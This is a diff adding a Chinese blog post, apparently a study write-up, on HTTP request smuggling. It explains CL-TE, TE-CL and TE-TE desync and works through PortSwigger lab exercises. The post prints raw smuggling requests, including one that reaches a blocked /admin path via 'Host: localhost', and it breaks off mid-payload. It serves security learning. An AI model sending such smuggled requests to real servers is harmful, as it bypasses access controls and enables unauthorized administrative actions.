@@ -1,0 +1,1562 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+<link rel="stylesheet" href="/css/main.css?v=7.1.2">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.2">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.1.2">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.1.2">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.1.2" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.1.2',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: false,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="前言最早接触HTTP请求走私是在RoarCTF2019中，比赛时并没有解出那道题，之后也迟迟没有完整的学习HTTP请求走私，仅仅是简单看看文章，并没有理解用法，在EIS2019中再次出现请求走私，不得不逼迫自己完整的去学习一遍。">
+<meta name="keywords" content="web安全,HTTP请求走私">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTTP请求走私学习">
+<meta property="og:url" content="https://songxpu.github.io/2019/11/24/HTTP走私攻击/index.html">
+<meta property="og:site_name" content="Pines404">
+<meta property="og:description" content="前言最早接触HTTP请求走私是在RoarCTF2019中，比赛时并没有解出那道题，之后也迟迟没有完整的学习HTTP请求走私，仅仅是简单看看文章，并没有理解用法，在EIS2019中再次出现请求走私，不得不逼迫自己完整的去学习一遍。">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/24/HTTP走私攻击/14.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/24/HTTP走私攻击/13.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/24/HTTP走私攻击/12.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/24/HTTP走私攻击/11.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/24/HTTP走私攻击/1.png">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/24/HTTP走私攻击/2.png">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/24/HTTP走私攻击/4.png">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/24/HTTP走私攻击/5.png">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/24/HTTP走私攻击/7.png">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/24/HTTP走私攻击/6.png">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/24/HTTP走私攻击/8.png">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/24/HTTP走私攻击/9.png">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/24/HTTP走私攻击/10.png">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/24/HTTP走私攻击/11.png">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/24/HTTP走私攻击/1.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/24/HTTP走私攻击/2.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/24/HTTP走私攻击/3.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/24/HTTP走私攻击/4.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/24/HTTP走私攻击/5.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/24/HTTP走私攻击/6.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/24/HTTP走私攻击/7.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/24/HTTP走私攻击/8.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/24/HTTP走私攻击/9.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/24/HTTP走私攻击/10.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/24/HTTP走私攻击/15.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/24/HTTP走私攻击/16.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/24/HTTP走私攻击/17.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/24/HTTP走私攻击/18.jpg">
+<meta property="og:updated_time" content="2019-11-29T06:54:47.699Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="HTTP请求走私学习">
+<meta name="twitter:description" content="前言最早接触HTTP请求走私是在RoarCTF2019中，比赛时并没有解出那道题，之后也迟迟没有完整的学习HTTP请求走私，仅仅是简单看看文章，并没有理解用法，在EIS2019中再次出现请求走私，不得不逼迫自己完整的去学习一遍。">
+<meta name="twitter:image" content="https://songxpu.github.io/2019/11/24/HTTP走私攻击/14.jpg">
+
+
+
+
+
+  
+  
+  <link rel="canonical" href="https://songxpu.github.io/2019/11/24/HTTP走私攻击/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>HTTP请求走私学习 | Pines404</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Pines404</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">穷究于理，成就于工</p>
+      
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签<span class="badge">15</span></a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类<span class="badge">4</span></a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档<span class="badge">26</span></a>
+
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+  
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://songxpu.github.io/2019/11/24/HTTP走私攻击/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Azeroth">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pines404">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">HTTP请求走私学习
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-11-24 19:41:49" itemprop="dateCreated datePublished" datetime="2019-11-24T19:41:49+08:00">2019-11-24</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-11-29 14:54:47" itemprop="dateModified" datetime="2019-11-29T14:54:47+08:00">2019-11-29</time>
+              
+            
+          </span>
+		  
+		  
+			<span class="post-updated">
+			&nbsp; | &nbsp; 更新于
+			<time itemprop="dateUpdated" datetime="2019-11-29T14:54:47+08:00" content="2019-11-29">
+			  2019-11-29
+			</time>
+		  </span>
+		  
+
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/web安全/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="post-meta-item-icon">
+            <i class="fa fa-eye"></i>
+             阅读次数： 
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+            <div class="post-symbolscount">
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">本文字数：</span>
+                
+                <span title="本文字数">11k</span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">10 分钟</span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最早接触HTTP请求走私是在RoarCTF2019中，比赛时并没有解出那道题，之后也迟迟没有完整的学习HTTP请求走私，仅仅是简单看看文章，并没有理解用法，在EIS2019中再次出现请求走私，不得不逼迫自己完整的去学习一遍。</p>
+<a id="more"></a>
+
+<h2 id="HTTP请求走私产生原因"><a href="#HTTP请求走私产生原因" class="headerlink" title="HTTP请求走私产生原因"></a>HTTP请求走私产生原因</h2><p>当前很多网站都用了CDN加速服务，在源站的前面加上一个具有缓存功能的反向代理服务器，用户在请求某些静态资源时，直接从代理服务器中就可以获取到，不用再从源站所在服务器获取，拓扑结构：</p>
+<img src="//songxpu.github.io/2019/11/24/HTTP走私攻击/14.jpg" width="400">
+
+<p>反向代理服务器与后端的源站服务器之间，会重用TCP链接，因为代理服务器与后端的源站服务器的IP地址是相对固定，不同用户的请求将通过代理服务器与源站服务器建立链接。</p>
+<p>但是由于两者服务器的实现方式不同，如果用户提交模糊的请求可能代理服务器认为这是一个HTTP请求，然后将其转发给了后端的源站服务器，但源站服务器经过解析处理后，只认为其中的一部分为正常请求，剩下的那一部分就是走私的请求了，这就是HTTP走私请求的由来。</p>
+<hr>
+<p>HTTP请求走私漏洞的原因是由于HTTP规范提供了两种不同方式来指定请求的结束位置，它们是<code>Content-Length</code>标头和<code>Transfer-Encoding</code>标头，<code>Content-Length</code>标头简单明了，它以字节为单位指定消息内容体的长度，例如：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: ac6f1ff11e5c7d4e806912d000080058.web-security-academy.net</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Cookie</span>: session=5n2xRNXtAYM9teOEn3jSkEDDabLe0Qv8</span><br><span class="line"><span class="attribute">Content-Length</span>: 35</span><br><span class="line">a=11</span><br></pre></td></tr></table></figure>
+
+<p><code>Transfer-Encoding</code>标头用于指定消息体使用分块编码（Chunked Encode），也就是说消息报文由一个或多个数据块组成，每个数据块大小以字节为单位（十六进制表示） 衡量，后跟换行符，然后是块内容，最重要的是：整个消息体以大小为0的块结束，也就是说解析遇到0数据块就结束。如：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: ac6f1ff11e5c7d4e806912d000080058.web-security-academy.net</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"><span class="attribute">b</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line">a=11</span><br><span class="line"></span><br><span class="line"><span class="attribute">0</span></span><br></pre></td></tr></table></figure>
+
+<p>其实理解起来真的很简单，相当于我发送请求，包含<code>Content-Length</code>，前端服务器解析后没有问题发送给后端服务器，但是我在请求时后面还包含了<code>Transfer-Encoding</code>，这样后端服务器进行解析便可执行我写在下面的一些命令，这样便可以绕过前端的waf。</p>
+<h2 id="走私请求种类"><a href="#走私请求种类" class="headerlink" title="走私请求种类"></a>走私请求种类</h2><h3 id="CL不为0的GET请求"><a href="#CL不为0的GET请求" class="headerlink" title="CL不为0的GET请求"></a>CL不为0的GET请求</h3><p>前端代理服务器允许GET请求携带请求体，但后端服务器不允许GET请求携带请求体，则后端服务器会忽略掉GET请求中的<code>Content-Length</code>，不进行处理，从而导致请求走私。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Host</span>: example.com\r\n</span><br><span class="line"><span class="attribute">Content-Length</span>: 44\r\n</span><br><span class="line"></span><br><span class="line">GET / secret HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Host</span>: example.com\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>
+
+<p>前端服务器收到该请求，通过读取<code>Content-Length</code>，判断这是一个完整的请求，然后转发给后端服务器，而后端服务器收到后，因为它不对<code>Content-Length</code>进行处理，由于<code>Pipeline</code>的存在，它就认为这是收到了两个请求。</p>
+<h3 id="CL-CL"><a href="#CL-CL" class="headerlink" title="CL-CL"></a>CL-CL</h3><p>假设中间的代理服务器和后端的源站服务器在收到类似的请求时，都不会返回400错误，但是中间代理服务器按照第一个<code>Content-Length</code>的值对请求进行处理，而后端服务器按照第二个<code>Content-Length</code>的值进行处理。这样有可能引发请求走私。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Host</span>: example.com\r\n</span><br><span class="line"><span class="attribute">Content-Length</span>: 8\r\n</span><br><span class="line"><span class="attribute">Content-Length</span>: 7\r\n</span><br><span class="line"></span><br><span class="line"><span class="attribute">12345\r\n</span></span><br><span class="line"><span class="attribute">a</span></span><br></pre></td></tr></table></figure>
+
+<p>前端代理服务器获取的数据包长度为 8，将以上数据包完整转发至后端服务器，但后端服务器仅接收长度为7的数据包。因此读取前7个字符后，后端服务器认为本次请求已经读取完毕，然后返回响应。</p>
+<p>但此时缓冲区仍留下一个a，对于后端服务器来讲，这个a是下一个请求的一部分，但没传输完毕。如果此时传来一个请求</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">HOST</span>: test.com</span><br></pre></td></tr></table></figure>
+
+<p>那么前端服务器和后端服务器将重用TCP连接，使后端实际接收的请求为：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aGET / HTTP/1.1</span><br><span class="line"><span class="attribute">HOST</span>: test.com</span><br></pre></td></tr></table></figure>
+
+<p>从而实现了一次HTTP请求攻击。</p>
+<h3 id="CL-TE"><a href="#CL-TE" class="headerlink" title="CL-TE"></a>CL-TE</h3><blockquote>
+<p><code>RFC2616</code>的第4.4节中，规定:如果收到同时存在Content-Length和Transfer-Encoding这两个请求头的请求包时，在处理的时候必须忽略Content-Length。</p>
+</blockquote>
+<p>Chunk传输数据格式如下，其中<strong>size的值由16进制表示</strong>：</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">chunk size</span>][<span class="symbol">\r\n</span>]</span><br><span class="line">[<span class="string">chunk data</span>][<span class="symbol">\r\n</span>]</span><br><span class="line">[<span class="string">chunk size</span>][<span class="symbol">\r\n</span>]</span><br><span class="line">[chunk data][\r\n</span><br><span class="line">[<span class="string">chunk size = 0</span>][<span class="symbol">\r\n</span>]</span><br><span class="line">[\r\n]</span><br></pre></td></tr></table></figure>
+
+<p>即：当收到存在两个请求头的请求包时，前端服务器只对Content-Length这一请求，而后端服务器将忽略Content-Length，去处理Transfer-Encoding这一请求。</p>
+<p><strong>实验地址</strong>：<a href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te</a></p>
+<p><strong>实验描述</strong>：</p>
+<p>本实验涉及一个前端和后端服务器，两个服务器以不同的方式处理重复的HTTP请求标头。前端服务器拒绝未使用GET或POST方法的请求。</p>
+<p>要解决此问题，请向后端服务器走私一个请求，以便后端服务器处理的下一个请求似乎使用GPOST方法。</p>
+<p><strong>实验过程</strong>：</p>
+<img src="//songxpu.github.io/2019/11/24/HTTP走私攻击/13.jpg" width="600">
+
+<h3 id="TE-CL"><a href="#TE-CL" class="headerlink" title="TE-CL"></a>TE-CL</h3><p>当收到存在两个请求头的请求包时，前端服务器处理Transfer-Encoding这一请求，而后端服务器只对Content-Length请求头。</p>
+<p><strong>实验地址</strong>：<a href="https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl</a></p>
+<p><strong>实验描述</strong>：</p>
+<p>本实验涉及一个前端和后端服务器，两个服务器以不同的方式处理重复的HTTP请求标头。前端服务器拒绝未使用GET或POST方法的请求。</p>
+<p>要解决此问题，请向后端服务器走私一个请求，以便后端服务器处理的下一个请求似乎使用GPOST方法。</p>
+<p><strong>实验过程</strong>：</p>
+<img src="//songxpu.github.io/2019/11/24/HTTP走私攻击/12.jpg" width="600">
+
+<h3 id="TE-TE"><a href="#TE-TE" class="headerlink" title="TE-TE"></a>TE-TE</h3><p>当收到存在两个请求头的请求包时，前后端服务器都处理<code>Transfer-Encoding</code>请求头，这确实是实现了RFC的标准。不过前后端服务器毕竟不是同一种，这就有了一种方法，我们可以对发送的请求包中的<code>Transfer-Encoding</code>进行某种混淆操作，从而使其中一个服务器不处理<code>Transfer-Encoding</code>请求头。从某种意义上还是<code>CL-TE</code>或者<code>TE-CL</code>。</p>
+<p><strong>实验地址</strong>：<a href="https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header</a></p>
+<p><strong>实验描述</strong>：</p>
+<p>本实验涉及一个前端和后端服务器，两个服务器以不同的方式处理重复的HTTP请求标头。前端服务器拒绝未使用GET或POST方法的请求。</p>
+<p>要解决此问题，请向后端服务器走私一个请求，以便后端服务器处理的下一个请求似乎使用GPOST方法。</p>
+<p><strong>实验过程</strong>：</p>
+<img src="//songxpu.github.io/2019/11/24/HTTP走私攻击/11.jpg" width="600">
+
+<p>本质上因为前后端服务器对TE头解释不一致导致请求走私，可视作是TE-CL或CL-TE；经过测试，本实验中应该属于TE-CL。</p>
+<p>前端服务器处理TE头，将数据转发至后端服务器；后端服务器处理CL内容，于是<code>GPOST</code>请求走私成功。</p>
+<h2 id="攻击实例"><a href="#攻击实例" class="headerlink" title="攻击实例"></a>攻击实例</h2><h3 id="绕过前端服务器安全控制"><a href="#绕过前端服务器安全控制" class="headerlink" title="绕过前端服务器安全控制"></a>绕过前端服务器安全控制</h3><p>在这个网络环境下，前端服务器负责安全控制，只有被允许的请求才能转发给后端服务器，而后端服务器无条件的相信前端服务器转发过来的全部请求，并对每一个请求都进行响应。</p>
+<p>在这种情况下可以利用HTTP请求走私，将无法访问的请求走私给后端服务器以获得响应。</p>
+<h4 id="CL-TE绕过前端服务器安全控制"><a href="#CL-TE绕过前端服务器安全控制" class="headerlink" title="CL-TE绕过前端服务器安全控制"></a>CL-TE绕过前端服务器安全控制</h4><p><strong>实验地址</strong>：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te</a></p>
+<p><strong>实验描述</strong>：</p>
+<p>本实验中包括一个前端和后端服务器，前端服务器不支持chunked encoding。同时本实验存在管理员系统/admin，但前端服务器限制了直接访问它。</p>
+<p>要完成本实验，需向后端服务器走私一个http请求以访问到管理员系统并删除名为<code>carlos</code>的用户。</p>
+<p><strong>实验过程</strong></p>
+<p>分别访问/home和/admin，前者显示<code>&quot;Not Found&quot;</code>，后者显示<code>&quot;Path /admin is blocked&quot;</code></p>
+<img src="//songxpu.github.io/2019/11/24/HTTP走私攻击/1.png">
+
+<img src="//songxpu.github.io/2019/11/24/HTTP走私攻击/2.png">
+
+<p>已提示CL-TE，即前端只识别<code>Content-Length</code>，后端只识别<code>Transfer-Encoding</code></p>
+<p>构造一个走私请求</p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">GET <span class="regexp">/home HTTP/</span><span class="number">1.1</span></span><br><span class="line"><span class="string">Host:</span> ac6c1fff1e1b83fa809c15fe009a008d.web-security-academy.net</span><br><span class="line"><span class="string">Connection:</span> close</span><br><span class="line">Upgrade-Insecure-<span class="string">Requests:</span> <span class="number">1</span></span><br><span class="line">User-<span class="string">Agent:</span> Mozilla<span class="regexp">/5.0 (Windows NT 10.0; WOW64) AppleWebKit/</span><span class="number">537.36</span> (KHTML, like Gecko) Chrome<span class="regexp">/69.0.3497.100 Safari/</span><span class="number">537.36</span></span><br><span class="line"><span class="string">Accept:</span> text<span class="regexp">/html,application/</span>xhtml+xml,application<span class="regexp">/xml;q=0.9,image/</span>webp,image<span class="regexp">/apng,*/</span>*;q=<span class="number">0.8</span></span><br><span class="line">Accept-<span class="string">Encoding:</span> gzip, deflate</span><br><span class="line">Accept-<span class="string">Language:</span> zh-CN,zh;q=<span class="number">0.9</span></span><br><span class="line"><span class="string">Cookie:</span> session=ZZT6WpfyCJOaSO3LiMQrzMhEU7gIW0GE</span><br><span class="line">Content-<span class="string">Length:</span> <span class="number">24</span></span><br><span class="line">Transfer-<span class="string">Encoding:</span> chunked</span><br><span class="line"></span><br><span class="line"><span class="number">0</span></span><br><span class="line"></span><br><span class="line">GET <span class="regexp">/admin HTTP/</span><span class="number">1.1</span></span><br></pre></td></tr></table></figure>
+
+<p>根据返回消息可知需要使用POST方法</p>
+<p>多次发送请求后收到提示：需要以localhost形式访问/admin</p>
+<p>如果不成功需要多次发送请求</p>
+<img src="//songxpu.github.io/2019/11/24/HTTP走私攻击/4.png">
+
+<p>添加<code>Host: localhost</code>后多次发送请求</p>
+<img src="//songxpu.github.io/2019/11/24/HTTP走私攻击/5.png">
+
+<p>提示：不允许提交重复的header names，此处官网给出的解释是：</p>
+<blockquote>
+<p>Observe that the request was blocked due to the second request’s Host header conflicting with the smuggled Host header in the first request.</p>
+<p>Issue the following request twice so the second request’s headers are appended to the smuggled request body instead:</p>
+<hr>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">POST / HTTP/1.1</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">Host: your-lab-id.web-security-academy.net</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">Content-Length: 116</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">Transfer-Encoding: chunked</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">0</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">GET /admin HTTP/1.1</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">Host: localhost</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">Content-Length: 10</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"></span></span><br><span class="line"><span class="meta">&gt;</span><span 